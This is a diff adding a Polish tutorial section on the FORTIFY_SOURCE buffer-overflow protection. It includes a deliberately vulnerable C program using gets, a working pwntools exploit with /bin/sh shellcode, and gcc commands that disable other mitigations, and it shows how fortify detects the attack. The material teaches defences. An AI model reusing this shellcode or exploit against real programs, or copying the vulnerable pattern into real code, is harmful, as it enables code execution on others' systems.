@@ -290,3 +290,134 @@ Jak widać pamięć stosu _main_ w obu przypadkach wygląda tak samo (więc w ob
 ### Użyteczność metody oraz wady jej stosowania
 
 Powyższa metoda jest skuteczna jeśli chodzi o zapobieganie wykonywania instrukcji na stosie funkcji. Możliwym dla atakującego obejściem jest np. zastosowanie ataku typu _return-to-libc_. Z tego właśnie względu metoda ta szczególnie dobrze sprawdzi się z jednoczesnym użyciem innych metod np. _ASLR_.
+
+## Fortify
+
+### Zakres działania
+
+Omawiane w tym punkcie zabezpieczenie może stanowić kolejną warstwę ochrony przed atakami typu _buffer overflow_. Może wykryć atak tego typu zarówno podczas kompilacji, jak i w trakcie wykonywania programu (w zależności od typu podatności). Działa na zasadzie sprawdzania, czy nie następuje próba podania do bufora ilości bitów, która spowoduje jego przepełnienie. Sprawdzeń dokonuję w miejscach potencjalnie niebezpiecznych (więc w miejscach użycia niebezpiecznych funkcji, m.in. _memcpy, mempcpy, memmove, memset, strcpy, stpcpy, strncpy, strcat, strncat, sprintf, vsprintf, snprintf, vsnprintf, gets_). 
+
+W ogólności miejsce mogą mieć następujące przypadki:
+- Następuje sprawdzenie niebezpiecznej funkcji i stwierdzenie (bazując na zaimplementowanych mechanizmach), że nie
+ma możliwości przepełnienia bufora w danym miejscu - program wykonuje się normalnie, nie dochodzi do dodatkowego
+sprawdzania podczas wykonania.
+- Następuje sprawdzenie niebezpiecznej funkcji, ale zabezpieczenie nie jest w stanie stwierdzić w trakcie kompilacji, czy
+będzie mogło w tym miejscu dojść do przepełnienia bufora - funkcje sprawdzające zostają dodane do programu.
+- Następuje sprawdzenie niebezpiecznej funkcji, oraz stwierdzenie przepełnienia bufora - skutkuje to ostrzeżeniem użytkow-
+nika przy kompilacji, oraz użyciem funkcji sprawdzających przy wykonaniu programu.
+- Następuje sprawdzenie niebezpiecznych funkcji, i okazuje się że program nie jest w stanie stwierdzić możliwego przepeł-
+nienia, oraz brakuje danych dla użycia funkcji sprawdzających - w tym wypadku potencjalne przepełnienie nie zostanie zatrzymane przez omawiane zabezpieczenie.  
+
+Poniżej porównanie kodu _Assemblera_ (dla kompilatora _gcc_) przy użyciu zabezpieczenia _Fortify_, oraz przy jego wyłączeniu. W tym przypadku została zastosowana niebezpieczna funkcja _gets_.  
+
+<p align="center">
+  <img src="obrazy/noF_vs_F2.png" />
+</p>
+<p align = "center">
+  Rys. 9 - Po lewej użyta flaga: -D FORTIFY SOURCE=2, a po prawej: -D FORTIFY SOURCE=0.
+</p>   
+
+Dla omawianej implementacji, istnieją dwa poziomy zabezpieczenia: ```-D FORTIFY SOURCE=1```, oraz
+```-D FORTIFY SOURCE=2```. Dla ```-D FORTIFY SOURCE=2``` do sprawdzenia dodanych jest więcej rzeczy. Jedną z różnic jest dodatkowe sprawdzenie funkcji takich jak _printf_, co może zapobiec eksploitacji podatności bazujących na _format string_.
+
+<p align="center">
+  <img src="obrazy/F1_vs_F2.png" />
+</p>
+<p align = "center">
+  Rys. 10 - Po lewej użyta flaga: -D FORTIFY SOURCE=2, a po prawej: -D FORTIFY SOURCE=1.
+</p> 
+
+### Przykładowa aplikacja
+
+W celu zaprezentowania zabezpieczenia, użyje kodu aplikacji pokazanej przy omawianiu kanarków stosu. Dla przypomnie- nia aplikacja używa niebezpiecznej funkcji _gets_. Poniżej kod programu:
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+void get_users_name()
+{
+    char name[64] = {0};
+    puts("Podaj imie:");
+    gets(name);
+    printf("Czesc %s!\n", name);
+}
+
+int main()
+{
+    int x;
+    printf("Adres na stosie main: %p\n", &x);
+    get_users_name();
+    return 0;
+}
+```
+Plik _main.c_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Fortify_.
+
+### Exploit
+
+Poniższy exploit działa na tej samej zasadzie co [exploit w sekcji _Kanarki stosu_](#exploit).
+
+```Python
+from pwn import *
+
+p = process("./main")
+p.readuntil("Adres na stosie main: ")
+stack_ptr = int(p.readuntil("\n").strip(), 16)
+p.readuntil("Podaj imie:\n")
+
+padding = b'\x90'*72
+RIP = p64(stack_ptr)
+NOP = b'\x90'*128
+shellcode =b'\xeb\x1e\x5f\x48\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x48\x31\xc9\x0f\x05\x48\x31\xc0\x48\x31\xff\xb0\x3c\x0f\x05\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x70\xd8\xff\xff\xff\x7f'
+payload =  padding + RIP + NOP + shellcode
+
+gdb.attach(p)
+
+p.sendline(payload)
+print(p.readall())
+```
+
+Plik _exploit.py_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Fortify_.
+
+#### Działanie exploit'a dla programu bez włączonego zabezpieczenia oraz z włączonym zabezpieczeniem
+
+Poniżej wynik wykonania exploit’a komendą ```python3 exploit.py``` z wyłączonym fortify (komenda użyta do kompilacji pliku main.c: ```gcc -O2 main.c -fno-stack-protector -std=c99 -z execstack -D FORTIFY SOURCE=0 -W -o main -Wl,-z,norelro```):
+
+<p align="center">
+  <img src="obrazy/exploit0.png" />
+</p>
+<p align = "center">
+  Rys. 11 - Udany atak przy wyłączonym fortify.
+</p>
+
+Tym razem program skompilowany poleceniem: ```gcc -O2 main.c -fno-stack-protector -std=c99 -z execstack -D FORTIFY SOURCE=2 -W -o main -Wl,-z,norelro```:
+
+<p align="center">
+  <img src="obrazy/exploit1.png" />
+</p>
+<p align = "center">
+  Rys. 12 - Atak wykryty dzięki fortify.
+</p>
+
+Zgodnie ze wcześniejszym opisem, w przypadku tego ataku, równie dobrze powinno poradzić sobie zabezpieczenie usta- wione na niższy poziom. Polecenie użyte do kompilacji: ```gcc -O2 main.c -fno-stack-protector -std=c99 -z execstack
+-D FORTIFY SOURCE=1 -W -o main -Wl,-z,norelro```
+
+<p align="center">
+  <img src="obrazy/exploit1.png" />
+</p>
+<p align = "center">
+  Rys. 13 - Atak wykryty dzięki fortify (ustawionym na poziom 1).
+</p>
+
+### Porównanie metody dla kompilatorów _gcc_ oraz _clang_
+
+Podczas gdy _gcc_ w pełni wspiera omawiane zabezpieczenie, _clang_ nie jest kompatibilny z jego implementacją.
+
+### Użyteczność metody oraz wady jej stosowania
+
+Metoda ta nie wpływa w znaczącym stopniu, ani na wydajność programu, ani na jego rozmiar. Warto ją używać jako jedno z zabezpieczeń. Niestety, zabezpiecza jedynie przed niektórymi atakami opierającymi się na _buffer overflow_. Samodzielnie nie stanowi solidnego zabezpieczenia.
+
+# Wnioski
+
+W powyższej pracy zostały omówione niektóre z najczęściej stosowanych zabezpieczeń. W rzeczywistości jest ich bardzo wiele i dopiero połączenie wielu metod na raz zapewnia bardzo wysoką ochronę. Wybranie metod powinno być odpowiednio zoptymalizowane, a projektant oprogramowania powinien wziąć pod uwagę poziom uzyskiwanej ochrony, względem pogor- szenia wydajności, czy zwiększenia ilości wymaganej pamięci.
+
